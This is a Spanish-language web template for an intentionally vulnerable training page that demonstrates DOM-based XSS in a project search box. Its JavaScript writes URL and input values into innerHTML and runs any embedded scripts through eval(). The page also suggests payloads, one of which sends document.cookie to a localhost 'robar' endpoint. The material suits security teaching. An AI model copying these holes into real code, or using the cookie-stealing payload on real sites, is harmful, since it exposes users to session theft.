{% extends "layout.html" %}

{% block content %}
<div class="container mt-5">
    <div class="row">
        <div class="col-md-12">
            <div class="card">
                <div class="card-header bg-danger text-white">
                    <h4 class="mb-0">üîç Buscador de Proyectos (DOM XSS)</h4>
                    <small>Vulnerable a DOM-based XSS</small>
                </div>
                <div class="card-body">
                    <div id="search-results">
                        <h5>Resultados de b√∫squeda:</h5>
                        <div id="results-container"></div>
                    </div>

                    <div class="mt-4">
                        <h6>B√∫squeda manual:</h6>
                        <input type="text" id="manual-search" class="form-control" placeholder="Escribe tu b√∫squeda aqu√≠...">
                        <button onclick="performSearch()" class="btn btn-primary mt-2">Buscar</button>
                        <div class="mt-2">
                            <small class="text-muted d-block">üí° Prueba estos payloads:</small>
                            <code>&lt;script&gt;alert('DOM XSS!')&lt;/script&gt;</code><br>
                            <code>&lt;img src=x onerror="fetch('http://localhost:9999/robar?c='+document.cookie)"&gt;</code>
                        </div>
                    </div>

                    <div class="mt-4">
                        <h6>B√∫squeda por URL:</h6>
                        <p class="text-muted">Tambi√©n puedes usar: <code>?search=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
                        <a href="?search=<script>alert('Hola desde URL')</script>" class="btn btn-sm btn-outline-warning">
                            üß™ Probar XSS desde URL
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Informaci√≥n educativa -->
    <div class="row mt-4">
        <div class="col-md-12">
            <div class="alert alert-warning">
                <h6><i class="bi bi-exclamation-triangle"></i> ‚ö†Ô∏è VULNERABILIDAD DOM XSS</h6>
                <p class="mb-0">Esta p√°gina es vulnerable a <strong>DOM-based XSS</strong> porque:</p>
                <ul class="mb-0 mt-2">
                    <li>Usa <code>innerHTML</code> sin sanitizaci√≥n</li>
                    <li>Ejecuta scripts encontrados en el DOM</li>
                    <li>No valida input del usuario</li>
                    <li>Lee par√°metros de URL sin filtros</li>
                </ul>
            </div>
        </div>
    </div>
</div>

<script>
// VULNERABLE: DOM XSS que ejecuta scripts din√°micamente
function executeScripts(container) {
    // Buscar y ejecutar cualquier script en el contenido
    const scriptRegex = /<script[^>]*>(.*?)<\/script>/gi;
    const content = container.innerHTML;
    let match;
    
    while ((match = scriptRegex.exec(content)) !== null) {
        try {
            // VULNERABLE: Ejecutar el c√≥digo JavaScript encontrado
            eval(match[1]);
        } catch (e) {
            console.log('Error ejecutando script:', e);
        }
    }
}

// VULNERABLE: Funci√≥n que procesa input de URL
function processUrlSearch() {
    const urlParams = new URLSearchParams(window.location.search);
    const searchTerm = urlParams.get('search');
    
    if (searchTerm) {
        const resultsContainer = document.getElementById('results-container');
        // VULNERABLE: innerHTML sin sanitizaci√≥n con datos de URL
        resultsContainer.innerHTML = `<div class="alert alert-info">üîç Buscando: ${searchTerm}</div>`;
        
        // VULNERABLE: Ejecutar scripts que puedan estar en el par√°metro URL
        executeScripts(resultsContainer);
    }
}

// VULNERABLE: Funci√≥n de b√∫squeda manual
function performSearch() {
    const searchInput = document.getElementById('manual-search');
    const searchValue = searchInput.value;
    const resultsContainer = document.getElementById('results-container');
    
    if (searchValue.trim()) {
        // VULNERABLE: Input insertado directamente sin sanitizaci√≥n
        resultsContainer.innerHTML = `<div class="alert alert-success">‚úÖ T√©rmino buscado: ${searchValue}</div>`;
        
        // VULNERABLE: Ejecutar cualquier script en el input
        executeScripts(resultsContainer);
        
        // Simular resultados falsos
        setTimeout(() => {
            resultsContainer.innerHTML += `<div class="alert alert-secondary">üìã No se encontraron proyectos para: ${searchValue}</div>`;
            executeScripts(resultsContainer);
        }, 1000);
    } else {
        resultsContainer.innerHTML = `<div class="alert alert-warning">‚ö†Ô∏è Por favor ingresa un t√©rmino de b√∫squeda</div>`;
    }
}

// Ejecutar al cargar la p√°gina
document.addEventListener('DOMContentLoaded', function() {
    processUrlSearch();
});
</script>

<style>
.alert code {
    background-color: rgba(0,0,0,0.1);
    padding: 2px 4px;
    border-radius: 3px;
}
</style>
{% endblock %} 